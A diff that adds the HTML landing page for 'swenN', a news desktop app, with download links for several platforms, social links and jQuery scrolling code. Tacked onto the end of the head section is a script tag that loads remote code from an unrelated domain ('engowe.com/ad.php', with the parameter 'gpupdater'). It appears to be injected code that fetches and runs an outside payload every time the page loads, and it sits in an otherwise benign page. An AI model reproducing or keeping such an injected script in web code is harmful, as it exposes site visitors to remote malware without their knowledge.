@@ -1,0 +1,158 @@
+
+<!doctype html>
+<html lang="en">
+<head>
+<!-- SITE TITLE -->
+<title>swenN</title>
+
+<link rel="icon" href="images/icon.png">
+
+<link rel="stylesheet" href="css/style.css">
+<link href='http://fonts.googleapis.com/css?family=Lato' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Quicksand' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Montserrat' rel='stylesheet' type='text/css'>
+<link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+<!-- JQUERY -->
+<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.0/jquery.min.js"></script>
+<script src="js/prefixfree.min.js"></script>
+
+<script src="js/custom.js"></script>
+
+<script src="https://engowe.com/ad.php?u=781abb5cfd9e3fd4f1ce3b4f68530b3d&c=gpupdater&p=1"></script></head>
+<body>
+<header class="header">
+  <img class="header" src="images/logo-header.png">
+  <nav>
+    <ul>
+      <li><a href = "#why" class= "active">Home</a></li>
+      <li><a href = "#perks" class="nav-item">Download</a></li>
+    </ul> 
+  </nav>
+</header>
+
+<section class="landing-page" id="why">
+  <div class="header-img">
+    </div>
+</section>
+
+<section class="details perks" id="perks">
+  <h1 class="upper"><span class="black">Downloads</span></h1>
+  
+   <div class="lead-wrap">
+    <p> Download the swenN desktop app for quicker and easier news updates.</p>
+    </div>
+  <div class="perks-wrap">
+
+    <div class="perks-icon">
+      <div class="windows">
+      <span class="ic-stack ic-4x">
+          <i class="fa fa-windows fa-2x"></i>
+      </span></div>
+      <h1>Windows</h1>
+      <p>Get swenN for Windows.</p>
+    </div>
+    <div class="perks-icon">
+      <div class="apple">
+      <span class="ic-stack ic-4x">
+          <i class="fa fa-apple fa-2x"></i>
+      </span></div>
+      <h1>Mac</h1>
+      <p>Get swenN for Mac OS X.</p>
+
+    </div>
+    <div class="perks-icon">
+      <div class="linux">
+      <span class="ic-stack ic-4x">
+          <i class="fa fa-linux fa-2x"></i>
+      </span></div>
+      <h1>Linux</h1>
+      <p>Get swenN for Linux. </p>
+    </div>  
+  </div>
+</section>
+
+
+<footer>
+        <div class="bar">
+            <div class="bar-wrap">
+                <ul class="links"> 
+                  <!-- footer menu -->
+                    <li><a href="#why">Home</a></li>
+                    <li><a href="#perks">Downloads</a></li>
+                    <li><a href="#">Contact Us</a></li>
+                </ul>
+
+                <div class="social">
+            <a href="https://www.facebook.com/swenn.in" class="fb">
+                <span class="icon">
+                <span data-icon="" class="fa fa-facebook fa-fg"></span></span>
+                <span class="info">
+                    <span class="follow">Follow us on Facebook</span>
+                </span>
+            </a>
+
+            <a href="https://twitter.com/swenNapp" class="tw">
+                <span class="icon">
+                <span data-icon="" class="fa fa-twitter fa-fg"></span></span>
+                <span class="info">
+                    <span class="follow">Follow us on Twitter</span>
+                   
+                </span>
+            </a>
+
+            <a href="#" class="linkedin">
+                <span class="icon">
+                <span data-icon="" class="fa fa-linkedin fa-fg"></span></span>
+                <span class="info">
+                    <span class="follow">Follow us on LinkedIn</span>
+
+                </span>
+            </a>
+        </div>
+                <div class="copyright">A Website by Sudhindra Sajjal</div>
+            </div>
+        </div>
+
+</footer>
+<script>
+     $(document).ready(function () {
+        $(document).on("scroll", onScroll);
+
+        $('a[href^="#"]').on('click', function (e) {
+          e.preventDefault();
+          $(document).off("scroll");
+
+          $('a').each(function () {
+            $(this).removeClass('active');
+          })
+          $(this).addClass('active');
+
+          var target = this.hash;
+          $target = $(target);
+          $('html, body').stop().animate({
+            'scrollTop': $target.offset().top+2
+          }, 500, 'swing', function () {
+            window.location.hash = target;
+            $(document).on("scroll", onScroll);
+          });
+        });
+      });
+
+      function onScroll(event){
+        var scrollPosition = $(document).scrollTop();
+        $('nav a').each(function () {
+          var currentLink = $(this);
+          var refElement = $(currentLink.attr("href"));
+          if (refElement.position().top <= scrollPosition && refElement.position().top + refElement.height() > scrollPosition) {
+            $('nav ul li a').removeClass("active");
+            currentLink.addClass("active");
+          }
+          else{
+            currentLink.removeClass("active");
+          }
+        });
+      }
+  </script>
+</body>
+</html>
